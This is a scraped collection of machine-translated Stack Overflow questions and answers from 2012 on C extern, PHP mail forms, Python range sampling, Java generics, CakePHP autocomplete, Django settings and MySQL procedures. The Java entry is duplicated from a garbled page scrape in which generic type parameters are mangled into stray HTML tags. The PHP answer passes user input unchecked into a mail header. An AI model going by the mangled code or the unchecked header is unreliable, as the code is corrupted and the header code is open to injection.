> 时间：2012-04-10T07:00:43.800
> 
> 标签：c++, c

> **可能重复：**
> [什么是 C++ 中的外部链接和内部链接](https://stackoverflow.com/questions/1358400/what-is-external-linkage-and-internal-linkage-in-c)

其实我想知道的重要性`extern`。

首先我写了一些代码：

文件1.h

```
extern int i; 
```

文件2.c

```
#include<stdio.h>
#include "file1.h"
 int i=20;
int main()
{
   printf("%d",i);
   return 0;
} 
```

现在我的问题是：当我必须定义`i`in时，使用 extern 变量有什么用`file2.c`，声明 in`file1.h`对我有用。

苏丹树

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-10T07:04:22.363

`extern`允许您声明一个变量（通知编译器它的存在）而不定义它（使其存在）。一般规则是您可以根据需要多次声明事物，但您只能定义一次。

例如，如果它将在别处定义，这将很有用。

考虑：

```
file1.c:                   file2.c:
    extern int xyzzy;          int xyzzy;
    void fn (void) {
        xyzzy = 42;
    } 
```

当您将这两个函数链接在一起时，将有*一个* `xyzzy`，定义在`file2.c`中的一个，这就是`fn`将更改的那个。

现在即使没有`extern`. 所做的`extern`是声明`xyzzy`存在*，* `file1.c`以便您不会收到任何`I don't know what the blazes "xyzzy" is`错误。

在您的特定情况下（如果这是您仅有的两个文件），您不需要它。仅当您有*另一个*`#include`d`file1.h`并尝试访问的文件时才需要它`i`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-10T07:09:29.370

C 中的“extern”声明表示存在全局变量及其类型。

在 C 中，大多数 .c 文件的行为就像一个单独的模块。因此，带有“extern”的变量是在当前模块外部定义的。

在一个地方定义全局，然后在所有其他地方声明对它的外部引用始终是一种更好的做法。在引用任何共享库提供的全局变量时，这很重要，以确保您的代码引用了正确且通用的变量实例。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-10T07:05:18.857

当您有三个文件时，它很有用：

foo.h

```
extern int i;
void bar(); 
```

交流：

```
#include "foo.h"
int i = 6;
int main(){
    bar();
} 
```

公元前：

```
#include "foo.h"
void bar(){
      printf("%d\n", i);
} 
```

正如您所看到的，它在and`i`之间共享，而不是在每个文件中重新定义，就像没有关键字一样。`a.c``b.c``extern`

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-04-10T07:12:54.050

来自[维基百科](http://en.wikipedia.org/wiki/External_variable)：

> 定义变量时，编译器会为该变量分配内存，并可能还将其内容初始化为某个值。声明变量时，编译器要求在别处定义该变量。该声明通知编译器存在具有该名称和类型的变量，但编译器不需要为它分配内存，因为它是在其他地方分配的。
> 
> extern 是一种显式声明变量的方法，或者在没有定义的情况下强制声明
> 
> 如果在文件 1 中定义了一个变量，为了在另一个文件中使用相同的变量，必须声明它。不管文件的数量是多少，这个变量只定义一次，但是，它必须在包含定义的文件之外的任何文件中声明。
> 
> 如果程序在多个源文件中，并且在 file1 中定义了一个变量并在 file2 和 file3 中使用，则需要在 file2 和 file3 中声明 extern 来连接变量的出现。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-10T07:05:02.887

让 extern 告诉编译器它是一个变量的声明。

在您在 file1.h 中的示例中，想象一下如果您没有指定 extern 关键字会发生什么。看起来 int i 有两个定义。此外，头文件可以包含在许多 .c 文件中。如果您编译这些 .c 文件并链接它们，链接器将看到同一变量的多个定义。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-04-10T07:39:19.073

标头中的声明允许您从多个源文件访问变量，同时仍然只在一个地方定义它。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-04-10T07:14:16.140

extern 关键字允许您对编译器说...“现在使用这个变量.. 我稍后会定义和初始化它”.. 即“现在编译它.. 我稍后会链接到它的定义”。

当您在其他文件中定义变量并希望在当前上下文中使用它时，您可以将其外部化。

# php - 使用字段中添加的信息的 javascript 验证 php 电子邮件

> ID：10084435
> 
> 赞同：0
> 
> 时间：2012-04-10T07:01:06.350
> 
> 标签：php, javascript, email-validation

我正在制作一个网站，但我卡住了我有一个表格

```
 <form name="inputForm" onSubmit="return validateForm();" action="#">
<fieldset>
    <p>
      <label>First Name:</label>
      <input type="text" name="first_name"/><br />
      <label>Surname:</label>
      <input type="text" name="surname"/><br />
      <label>Address number:</label>
      <input type="text" name="address_number"/><br />
      <label>Address name:</label>
      <input type="text" name="address_name"/><br />
      <label>Suburb:</label>
      <input type="text" name="suburb"/><br />
      <label>Postcode:</label>
      <input type="text" name="postcode"/><br />      
      <label>State:</label>
      <select name="state">
            <option value="nsw">NSW
            <option value="qld">QLD
            <option value="act">ACT
            <option value="vic">VIC
            <option value="sa">SA
            <option value="tas">TAS
            <option value="nt">NT
            <option value="wa">WA
          </SELECT><br />
      <label>Email:</label>
      <input type="text" name="email"/><br />
      <label>Phone Number:</label>
      <input type="text" name="phone"/><br />
      <input type="submit" name="submit" value="Send form" />
      <input type="reset" name="reset" value="reset" />
      </p>
</fieldset>
</form> 
```

然后由javascript验证

```
function validateForm()
{
    var form = document.forms['inputForm'];
    var formats = 
        {
            first_name: /^[a-zA-Z]+[\-'\s]?[a-zA-Z]+$/,                             /*works for a-Z allows - and '*/
            surname: /^[a-zA-Z]+[\-'\s]?[a-zA-z]+$/,                                /*works for a-Z allows - and '*/
            postcode: /^\d{4}$/,                                                    /*4digit post code australia wide*/
            email: /^\w+([\.-]w+)*@\w+([\.-]?\w+)*(\.\w{2,4})+$/,                   /*allows all word characters and normal email formats*/
            address_number: /^\d[0-9]$/,                                                    /*allows any number of digits*/
            address_name: /^\w?\s?[a-zA-Z]+(,?\s([a-zA-Z])*)*$/,            /*allows numbers space capital letters and other word characters*/
            suburb: /^\w?\s?[a-zA-Z]+(,?\s([a-zA-Z])*)*$/,          /*allows numbers space capital letters and other word characters*/
            phone: /^\d{8}$/,                                                       /*8 number phone number*/
        };
        var elCount = form.elements.length;
        for(var i = 0; i<elCount; i++)
        {
            var field = form.elements[i];
            if(field.type == 'text')
            {
                if(!formats[field.name].test(field.value))
                {
                    alert('invalid '+ field.name.replace('_',' ')+'.');             /*alerts the name of the area not filled right in a pop up box*/
                    field.focus();
                    return false;
                }
            }
        }
        alert('All fields correct, the form will now submit.')
} 
```

然后我需要 php 来收集这些信息并将其发送到我的电子邮件地址（这是我卡住的地方）

```
<?php
if( isset( $_POST['submit'] ) || isset( $_POST['submit_x']))
{
    $to = "myemail@myemail.com";
      $subject = 'subject';
      $message = 'testing the php mail() function';
      $headers = "from: email\r\n";

        $body=" 
        Name: $name\n
        Email: $email\n
";
echo "the information has been sent we will be in contact with you shortly";
mail($to, $subject, $message, $headers);    
}
else
{
    echo "The informations has not been sent";
}
?> 
```

现在我已经为此苦恼了几天了，找不到任何我还在学习php和javascript的东西

javascript和HTML工作正常，它只是邮件功能，请帮忙

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:04:23.120

你需要指定方法..

```
form method="post" 
```

而且我不确定是否`action="#"`也是正确的使用方式

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:10:28.833

尝试[使用 isemail](http://isemail.info/about)在 PHP 中进行电子邮件验证。它是最全面的电子邮件验证脚本。它遵循所有关于电子邮件的 RFC。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T07:04:57.293

首先，将 method="post" 添加到表单中，如下所示：

下一个

```
 $headers = "from: email\r\n"; 
```

至

```
 $headers = "from: {$_POST['email']}\r\n"; 
```

# python - 在一个范围内生成均匀分布的倍数/样本

> ID：10084436
> 
> 赞同：4
> 
> 时间：2012-04-10T07:01:10.087
> 
> 标签：python

**问题的具体实例**
我的 int 范围为 1-100。我想在此范围内生成 n 个总数，这些总数**尽可能均匀分布，**并包括第一个和最后一个值。

**例子**

```
start = 1, end = 100, n = 5   
Output: [1, 25, 50, 75, 100]

start = 1, end = 100, n = 4   
Output: [1, 33, 66, 100]

start = 1, end = 100, n = 2   
Output: [1, 100] 
```

**我目前拥有**
的是 我实际上有一个可行的方法，但我一直觉得我在想这个并且错过了一些更简单的东西？这是最有效的方法还是可以改进？

```
def steps(start, end, n):
    n = min(end, max(n, 2) - 1)
    mult = end / float(n)
    yield start
    for scale in xrange(1, n+1):
        val = int(mult * scale)
        if val != start:
            yield val 
```

请注意，我确保此函数将始终至少返回范围的下限值和上限值。所以，我强迫`n >= 2`

仅作为搜索参考，我使用它从渲染序列中采样图像帧，您通常需要第一个、中间、最后一个。但我希望能够更好地扩展以处理非常长的图像序列并获得更好的覆盖范围。

**已解决：从所选答案**

我最终使用了@vartec 答案的这个稍微修改过的版本，作为生成器，并且还限制了`n`安全值：

```
def steps(start,end,n):
    n = min(end, max(n, 2))
    step = (end-start)/float(n-1)
    return (int(round(start+x*step)) for x in xrange(n)) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-10T09:16:52.150

您需要适当的舍入：

```
def steps(start,end,n):
    if n<2:
        raise Exception("behaviour not defined for n<2")
    step = (end-start)/float(n-1)
    return [int(round(start+x*step)) for x in range(n)] 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-10T09:00:24.973

额外的依赖，可能是矫枉过正，但简短，经过测试，应该给出正确的结果：[numpy.linspace](http://docs.scipy.org/doc/numpy-1.6.0/reference/generated/numpy.linspace.html#numpy.linspace)

```
>>> numpy.linspace(1, 100, 4).astype(int).tolist()
[1, 34, 67, 100] 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-10T08:46:45.647

使用的问题`range`是步长必须是整数，因此您会遇到舍入问题，例如`steps(1,100,4) == [1, 33, 66, 100]`. 如果您想要整数输出但想要尽可能多的一步，请使用浮点数作为您的步长。

```
>>> def steps(start,end,n):
...    step = (end-start)/float(n-1)
...    return [int(round(start+i*step)) for i in range(n)]

>>> steps(1,100,5)
>>> [1, 26, 51, 75, 100]
>>> steps(1,100,4)
>>> [1, 34, 67, 100]
>>> steps(1,100,2)
>>> [1, 100]
>>> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-10T07:28:28.847

```
>>> from itertools import count
>>> def steps(start,end,n):
        yield start
        begin = start if start>1 else 0
        c = count(begin,(end-begin)/(n-1))
        next(c)
        for _ in range(n-2):
            yield next(c)
        yield end

>>> list(steps(1,100,2))
[1, 100]
>>> list(steps(1,100,5))
[1, 25, 50, 75, 100]
>>> list(steps(1,100,4))
[1, 33, 66, 100]
>>> list(steps(50,100,3))
[50, 75, 100]
>>> list(steps(10,100,10))
[10, 20, 30, 40, 50, 60, 70, 80, 90, 100] 
```

可以缩短为

```
>>> from itertools import islice, count
>>> def steps(start,end,n):
        yield start
        begin = start if start>1 else 0
        c = islice(count(begin,(end-begin)/(n-1)),1,None)
        for _ in range(n-2):
            yield next(c)
        yield end 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-10T07:12:16.477

使用[range](http://docs.python.org/release/1.5.1p1/tut/range.html)有什么问题？这是您如何使用它的方法

```
>>> def steps(start,end,n):
    return [start]+range(start-1,end,end/(n-1))[1:]+[end]

>>> steps(1,100,5)
[1, 25, 50, 75, 100]
>>> steps(1,100,2)
[1, 100]
>>> 
```

# wcf - wcf msmq 服务何时进入故障状态

> ID：10084439
> 
> 赞同：1
> 
> 时间：2012-04-10T07:01:22.680
> 
> 标签：wcf

我创建了一个带有 NetMsmq 绑定的 wcf 服务。操作是一种方式。

我想处理故障异常。但是我发现即使在服务器端引发异常之后通道也不会出现故障。谁能告诉我在什么情况下 wcf 服务会进入故障状态（在使用 NetMsmqBinding 时提供）。

# javascript - 如何将 .ashx 文件中的值返回到变量中的 javascript

> ID：10084441
> 
> 赞同：1
> 
> 时间：2012-04-10T07:01:37.377
> 
> 标签：javascript, httphandler, ashx

我正在从 javascript 调用 ashx 文件。Http Handler 文件返回字符串值。

```
context.response.write(string value);

<script type="text/javascript">
$(window).load(function(){

$('area').each(function () {       
    var area = $(this),

alt = area.attr('id');
if (alt != null) {

                area.mouseenter(function () {
                    $('#dhtmltooltip').load("Search_CS.ashx?q=" +alt);
                    ddrivetip('', 300);
                }).mouseleave(function () {
                    $('#dhtmltooltip').html('');
                    hideddrivetip();
                });
            }

        }); 
```

我必须在 javascript 的变量中接收这个字符串。

如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T20:22:47.797

I guess you are not making any ajax requests. Does this [page](https://stackoverflow.com/questions/5904118/json-post-data-is-empty/5904246#5904246) help? There is a function call named "insertCustomerCallback" which will have the html returned from the handler. There you need to write your code. For e.g.,

```
function insertCustomerCallback(html) {
//write your code
} 
```

# java - 传递一个 ArrayList 到一个接受 ArrayList 作为参数的函数 in Java I am writing a generic java-android function that will accept as one of it's parameters an ArrayList, so that I can use all over my applicatio 问问题 问问题 2012-04-10T07:01:39.687 4560 次 This question shows research effort; it is useful and clear 2 This question does not show any research effort; it is unclear or not useful Bookmark this question. Show activity on this post. I am writing a generic java-android function that will accept as one of it's parameters an ArrayList, so that I can use all over my application regardless of the type of the ArrayList elements. This is my function: public GenericDisplayAdapter(Activity activity, ArrayList arrData) { this.m_ArrData = arrData; inflater = (LayoutInflater) activity .getSystemService(Context.LAYOUT_INFLATER_SERVICE); } When I try to to pass my ArrayList <customobject>as a parameter to this function, I get the error "can't cast from ArrayList <customobject>to ArrayList", m_LVStructDamageHeader.setAdapter(new GenericDisplayAdapter( (Activity)this, (ArrayList)arrStructDamageHeaders)); What is the best approach to handle such a situation, Thanks Consider also, that it may be appropriate to give the GenericDisplayAdapter class a type parameter. E.g. class GenericDisplayAdapter <t>{ private List <t>m_ArrData; public GenericDisplayAdapter(Activity activity, ArrayList <t>arrData) { ... } } So then other methods can take advantage of this type parameter, instead of dealing in Object, they can use T. javaandroidgenericsarraylist 4 4 回答 4 This answer is useful 4 Change your function from public GenericDisplayAdapter(Activity activity, ArrayList arrData) to public GenericDisplayAdapter(Activity activity, ArrayList arrData) Then you will be able to pass ArrayList <t>for any T. ArrayList is almost like ArrayList, but the difference is that while you can add ANY object into the ArrayList (which is pretty bad if you pass e.g. ArrayList <customobject>there), you cannot add anything into the ArrayList (which is fine). 于 2012-04-10T07:10:39.103 回答 This answer is useful 2 change the method parameter ArrayList to ArrayList 于 2012-04-10T07:10:05.047 回答 This answer is useful 1 You should you generic ArrayList just like public GenericDisplayAdapter(Activity activity, ArrayList arrData) { this.m_ArrData = arrData; inflater = (LayoutInflater) activity .getSystemService(Context.LAYOUT_INFLATER_SERVICE); } 于 2012-04-10T07:13:16.153 回答 This answer is useful 1 还要考虑，给 GenericDisplayAdapter 类一个类型参数可能是合适的。例如 class GenericDisplayAdapter <t>{ private List <t>m_ArrData; public GenericDisplayAdapter(Activity activity, ArrayList <t>arrData) { ... } } 那么其他方法可以利用这个类型参数，而不是处理Object，可以使用T。 于 2012-04-10T07:06:22.477 回答 Related 1 c# - XNA windows phone 发布黑色纹理 3 php - PDO 连接问题 2 r - svyby比例的置信区间 1 html - 处理草图未在 chrome 中渲染..？ 2 javascript - 等待动画完成 1 web-services - 托管帐户（非本地主机）上的 node.js 良好的安装服务器已启动但（未找到） 1 javascript - 引导单选按钮和折叠仅部分起作用 18 java - 'if' 语句末尾的分号 2 python - 如何在 Python 中使用 .writerow() 进行切片 1 c++ - 从同一个变量引用的参数指向不同的位置 Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641

> ID：10084443
> 
> 赞同：2
> 
> 时间：
> 
> 标签：java, android, generics, arraylist

I am writing a generic java-android function that will accept as one of it's parameters an `ArrayList<Object>`, so that I can use all over my application regardless of the type of the ArrayList elements.

This is my function:

```
public GenericDisplayAdapter(Activity activity, ArrayList<Object> arrData) {

    this.m_ArrData = arrData;
    inflater = (LayoutInflater) activity
            .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
} 
```

When I try to to pass my `ArrayList<CustomObject>` as a parameter to this function, I get the error "can't cast from `ArrayList<CustomObject>` to `ArrayList<Object>`",

```
 m_LVStructDamageHeader.setAdapter(new GenericDisplayAdapter(
            (Activity)this, (ArrayList<Object>)arrStructDamageHeaders)); 
```

What is the best approach to handle such a situation, Thanks

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-10T07:10:39.103

Change your function from

```
public GenericDisplayAdapter(Activity activity, ArrayList<Object> arrData) 
```

to

```
public GenericDisplayAdapter(Activity activity, ArrayList<?> arrData) 
```

Then you will be able to pass `ArrayList<T>` for any `T`. `ArrayList<?>` is almost like `ArrayList<Object>`, but the difference is that while you can add *ANY* object into the `ArrayList<Object>` (which is pretty bad if you pass e.g. `ArrayList<CustomObject>` there), you cannot add anything into the `ArrayList<?>` (which is fine).

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T07:10:05.047

change the method parameter

```
ArrayList<Object> to ArrayList<? extends Object> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-10T07:13:16.153

You should you generic ArrayList just like

```
public GenericDisplayAdapter(Activity activity, ArrayList<?> arrData) {

    this.m_ArrData = arrData;
    inflater = (LayoutInflater) activity
            .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-10T07:06:22.477

还要考虑，给 GenericDisplayAdapter 类一个类型参数可能是合适的。例如

```
class GenericDisplayAdapter<T> {
    private List<T> m_ArrData;

    public GenericDisplayAdapter(Activity activity, ArrayList<T> arrData) {
        ...
    }
} 
```

那么其他方法可以利用这个类型参数，而不是处理Object，可以使用T。</t></t></t></customobject></t></t></t></t></customobject></customobject>

# ajax - Cakephp 2.1 和 Jquery UI 自动完成

> ID：10084444
> 
> 赞同：0
> 
> 时间：2012-04-10T07:01:46.190
> 
> 标签：ajax, jquery-ui, cakephp, jquery

**使命：**

在称为部门的员工表单字段中实现部门的自动完成（保存在部门表中）。用户输入部门名称的几个拼写，这会显示与部门匹配的名称列表用户选择一个，就是这样。

**平台**

1.  蛋糕PHP 2.1
2.  Jquery UI Autocomplete（Jquery UI 库版本 1.8.18 的一部分）

**数据库模型**

员工 (id, first_name,last_name,department_id) 部门 (id,name)

所以在我的 add.ctp 文件中，ajax 调用类似于

```
 $( "#auto_complete" ).autocomplete({
        source: function( request, response ) {
            $.ajax({
                url:  "/employees/showDepartment",
                dataType: "json",
                data: {
                    featureClass: "P",
                    style: "full",
                    maxRows: 12,
                    name_startsWith: request.term
                },
                success: function( data ) {
                    alert("success--");
                    response( $.map( data, function( item ) {
                    //alert(item);
                        return {
                            label: item.name,
                            value: item.id
                        }
                    }));
                }
            });
        },
        minLength: 2,
        select: function( event, ui ) {
            log( ui.item ?
                "Selected: " + ui.item.label :
                "Nothing selected, input was " + this.value);
        },
        open: function() {
            $( this ).removeClass( "ui-corner-all" ).addClass( "ui-corner-top" );
        },
        close: function() {
            $( this ).removeClass( "ui-corner-top" ).addClass( "ui-corner-all" );
        }
    }); 
```

我的 EmployeeController 中有一个名为 show_depatment() 的操作

```
 public function getAddress() {
        $this->autoRender = false;// I do not want to make view against this  action. 
        $this->log($this->params->query['name_startsWith'] , 'debug');
        $str = $this->params->query['name_startsWith'];
        $this->log($str, 'debug');
        $this->layout = 'ajax';
        $departments = $this->Employee->Department->find('all', array( 'recursive' => -1,
            'conditions'=>array('Department.name LIKE'=>$str.'%'),
   'fields'=>array('name', 'id')));
        //$this->set('departments',$departments);
        $this->log($departments, 'debug');
        echo json_encode($departments);
} 
```

我不希望 show_department 操作有任何视图，所以我做了**$this->autoRender = false;**

但它没有按预期工作。

当我在响应和 HTLM 部分使用萤火虫调试响应时，它显示

```
 [{"Department":{"name":"Accounting","id":"4"}}] // when i type "acc" in input field 
```

问题

1.  如何使其显示在表单字段中。
2.  回声 json_encode($departments); 以json格式发送响应的正确方法吗？
3.  当我在 ajax 调用 (alert(item);) 的成功部分发出警报时，它给出的错误为“未定义”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T11:08:29.307

我是胖模型和瘦控制器的朋友，所以我的控制器动作看起来像这样

```
public function getAddress()
{
    if($this->RequestHandler->isAjax()) {
        Configure::write('debug', 0);
        $this->layout = 'ajax';
        $this->autoRender = false;
        echo json_encode($this->Employee->Department->getAddress($this->params['url']['term']));
        exit;
    }
} 
```

和我的部门模型方法：

```
public function getAddress($str)
{

    $rs = array();
    $search =  $this->find('all', array( 
        'recursive' => -1,
        'conditions'=>array('Department.name LIKE'=>$str.'%'),
        'fields'=>array('name', 'id')
    ));

    if (!empty($search))
    {
        //the jquery ui autocomplete requires object with label/value  so we need to traverse the query results and create required array 

        foreach ($search as $key => $val)
        {
            $rs[] = array('label' => $val['Department']['name'], 
              'value' => $val['Department']['id']);
        }
    }
    return $rs;
} 
```

最后我的视图条目是这样的：

```
$( "#auto_complete" ).autocomplete({
    minLength: 2,
    source: function( request, response ) {
        var term = request.term;
        if ( term in cache ) {
            response( cache[ term ] );
            return;
        }

        lastXhr = $.getJSON( "/employees/showDepartment", request, function( data, status, xhr ) {
            cache[ term ] = data;
            if ( xhr === lastXhr ) {
                response( data );
            }
        });
    }
}); 
```

希望这可以帮助。

# java - 我们可以在虚拟机配置中使用 JMX，比如堆大小吗？

> ID：10084445
> 
> 赞同：0
> 
> 时间：2012-04-10T07:01:47.077
> 
> 标签：java, jmx

我是 JMX 的新手。我正在浏览 JMX，发现我们可以使用 JMX 代理来管理/监控我的应用程序，但在这里我有一个问题。我们可以将 JMX 用于 JVM 配置，例如增加堆大小等吗？

任何机构有想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T08:15:03.147

最大堆大小在 JVM 启动时分配。运行中不可更改（需提前预约）

您可以使用 JMX 配置其他参数。例如，一个常见的选择是更改日志记录级别。

# django - 在 Django 中组织设置

> ID：10084451
> 
> 赞同：7
> 
> 时间：2012-04-10T07:02:34.393
> 
> 标签：django

我正在处理 Django 项目，该项目使用位于项目根目录中的几个“设置”文件中指定的几十个配置变量：

```
--> myproject
------> app folders
------> ...
--- settings.py
--- settings_global.py
--- settings_production.py
--- settings_development.py 
```

然后根据某些运行时参数（主机名等）将来自不同 settings_* 文件的变量导入到 settings.py 文件中。这一切都很好，但有时仍然很难找到某个变量，所以我想重新组织设置变量并将它们分成几类：

*   项目特定变量
*   django 特定变量
*   已安装应用程序的特定变量（例如 django_compressor 的设置等）
*   环境特定变量（生产/开发）

另外我想将所有设置文件，但 settings.py 文件移动到设置子目录：

```
--> myproject
------> app folders
------> ...
------> settings
---------- __init__.py
---------- common.py
---------- production.py
---------- development.py
---------- apps.py
---------- ...
--- settings.py 
```

我创建了设置子目录（以及空`__init__.py`文件）并复制/重命名了设置文件。然后我尝试在我的 setting.py 文件中导入这些变量，如下所示：

```
from settings.common import *
from settings.apps import * 
```

但是，我收到以下错误（即使 ROOT_URLCONF 存在于 settings/common.py 文件中）：

```
AttributeError: 'Settings' object has no attribute 'ROOT_URLCONF' 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-10T07:13:19.180

我认为您的 settings.py 模块和设置包之间存在名称冲突，请尝试将包重命名为其他名称

# git - 在 gitg 中暂存多个文件

> ID：10084452
> 
> 赞同：1
> 
> 时间：2012-04-10T07:02:45.630
> 
> 标签：git, staging, gitg

是否可以在 gitg 中暂存多个文件？在提交选项卡中，我可以选择所有未暂存的文件，但右键单击（同时按住 Shift）暂存似乎不起作用。拖动它们似乎也不起作用。我目前所做的就是右键单击-> 将它们一一进行。当然，有更简单的方法吗？我在 Linux Ubuntu 中使用 gitg。

# mysql - 如何在 MySQL Workbench 中创建和执行程序

> ID：10084458
> 
> 赞同：7
> 
> 时间：2012-04-10T07:03:22.570
> 
> 标签：mysql, mysql-error-1064

我在 MySQL 工作台中使用 SQL 编辑器创建了一个空间表点。要填写此表，以下是我正在使用的代码。

```
CREATE PROCEDURE fill_points( 
IN size INT(10) 
) 
BEGIN 
DECLARE i DOUBLE(10,1) DEFAULT size; 

DECLARE lon FLOAT(7,4); 
DECLARE lat FLOAT(6,4); 
DECLARE position VARCHAR(100); 

-- Deleting all. 
DELETE FROM Points; 

WHILE i > 0 DO 
SET lon = RAND() * 360 - 180; 
SET lat = RAND() * 180 - 90; 

SET position = CONCAT( 'POINT(', lon, ' ', lat, ')' ); 

INSERT INTO Points(name, location) VALUES ( CONCAT('name_', i), GeomFromText(position) ); 

SET i = i - 1; 
END WHILE; 
END 
```

当我执行它时，它显示错误

> 错误代码：1064。您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 1 行的“END”附近使用正确的语法

执行语句

`CALL fill_points(1000);`

显示相同的错误

我什至不知道我前进的方式是否正确。

有谁能够帮我...

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-10T07:11:50.257

您是否结束了整个查询？尝试设置一个**delimiter**，并在 END 之后使用它，以便服务器知道您完成了命令。

```
delimiter //
CREATE PROCEDURE fill_points( 
IN size INT(10) 
) 
BEGIN 
DECLARE i DOUBLE(10,1) DEFAULT size; 

DECLARE lon FLOAT(7,4); 
DECLARE lat FLOAT(6,4); 
DECLARE position VARCHAR(100); 

-- Deleting all. 
DELETE FROM Points; 

WHILE i > 0 DO 
SET lon = RAND() * 360 - 180; 
SET lat = RAND() * 180 - 90; 

SET position = CONCAT( 'POINT(', lon, ' ', lat, ')' ); 

INSERT INTO Points(name, location) VALUES ( CONCAT('name_', i), GeomFromText(position) ); 

SET i = i - 1; 
END WHILE; 
END //
delimiter ; 
```

### 此外，由

虽然`DELETE FROM TABLE`确实从表中删除所有数据，`TRUNCATE table`但这样做更快。除非您有充分的理由使用`DELETE`（它们存在），否则`TRUNCATE`可能就是您想要的。

# javascript - 动态创建元素并尝试将其值作为参数传递给函数 onkeyup

> ID：10084461
> 
> 赞同：1
> 
> 时间：2012-04-10T07:03:45.920
> 
> 标签：javascript

我正在向表中添加一行。在该行中的一个单元格中是一个我想要进行 ajax 调用的输入。但是，我在传递输入值时遇到问题。

我在这里说明了这个问题：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <script language="javascript">
      function addElement(){
        var id = 0;
        var tbl = document.getElementById('myTable');
        var rowInd = document.getElementById('row1').rowIndex;
        rowInd++;
        var row0 = tbl.insertRow( rowInd );
        var cell = row0.insertCell(0);
        //	cell.innerHTML = '<input type="text" id="myInput'+id+'" value="hello world" onkeyup="alert( '+this.value+' );" />';
        // acts as expected:  hello world
        //	cell.innerHTML = '<input type="text" id="myInput'+id+'" value="hello world" onkeyup="makeAjaxRequest( \'value='+this.value+'\' )" />';
        // Outputs:  value=undefined
        var theId = "myInput"+id;
        //	cell.innerHTML = '<input type="text" id="myInput'+id+'" value="hello world" onkeyup="makeAjaxRequest( \'value='+document.getElementById( theId ).value+'\' )" />';
        // Output:  Object required
        cell.innerHTML = '<input type="text" id="myInput'+id+'" value="hello world" onkeyup=" function(){ makeAjaxRequest( \'value='+this.value+'\' ) }" />';
        // Nothing happens
      }

      function makeAjaxRequest( val ){
        alert( val );
      }
    </script>
  </head>

  <body>
    <span onclick="addElement()">
      Click me
    </span>
    <br /><br />
    <table id="myTable">
      <tr id="row1"><td>hello</td></tr>
    </table>
  </body>
</html>
```

它直接进行 ajax 调用，因此我需要能够访问对象或值，以便进行搜索。任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:14:18.413

您可以像这样传递值：-

```
 urlData = "" ;
    postData = "vendorType=" + jQuery('#EnrollmentRoleId').val() + "&time=" + new Date().getTime();

    jQuery.ajax({
        url: urlData,
        data: postData,
        success: function(data) {
            //alert(data);
            jQuery('#EnrollmentVendorId').html(data);
            jQuery('#user_id_div').show();
            jQuery('#loading_image').hide();
        }
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T08:37:42.727

感谢您让我发现了 insertRow、rowIndex 和 insertCell！

顺便说一句，你白白地让你的生活复杂化。

```
cell.innerHTML = '<input type="text" id="myInput'+id+'" value="hello world" onkeyup=" function(){ makeAjaxRequest( \'value='+this.value+'\' ) }" />'; 
```

这是正确的方法（DOM兼容，没有innerHTML evil，blablabla）：

```
var input = document.createElement('input')
input.type = 'text'
input.id = 'myInput' + id
input.value = 'hello world'
input.onkeyup = function() {
    makeAjaxRequest(this.value) // this is how to make it work
}
cell.appendChild(input) // or use replaceChild depending on your needs 
```

通过时的问题`'value=' + this.value`是您传递了以下值：`value=hello world`.

另一个问题是，对于内联事件处理程序（如`onkeyup`HTML 中的），您不需要包装函数。以下将起作用：

```
cell.innerHTML = '<input type="text" id="myInput'+id+'" value="hello world" onkeyup="makeAjaxRequest( this.value );" />'; 
```

我没有测试过，但我怀疑通过包装另一个函数，这`this`是不同的。因此它为什么不能工作。

为避免歧义，请勿使用 HTML 事件处理程序。

# app-store - 苹果的应用商店：从应用商店更新我的应用时，它作为单独的应用程序安装。这是什么原因？

> ID：10084462
> 
> 赞同：0
> 
> 时间：2012-04-10T07:03:51.650
> 
> 标签：app-store

我开发了一个应用程序并发布在苹果的应用商店。现在我修改了其中的一些功能。在应用商店发布更新。应用商店批准了我的更新。现在，当我尝试在 iphone 中更新我的应用程序时，iTunes 中有一个安装按钮，并且该应用程序作为单独的应用程序安装。这是什么原因？请给我建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T09:51:22.963

您是否（不小心？）更改了应用程序的捆绑标识符？

# jquery - JSP 网站的图像编辑器

> ID：10084477
> 
> 赞同：2
> 
> 时间：2012-04-10T07:04:54.190
> 
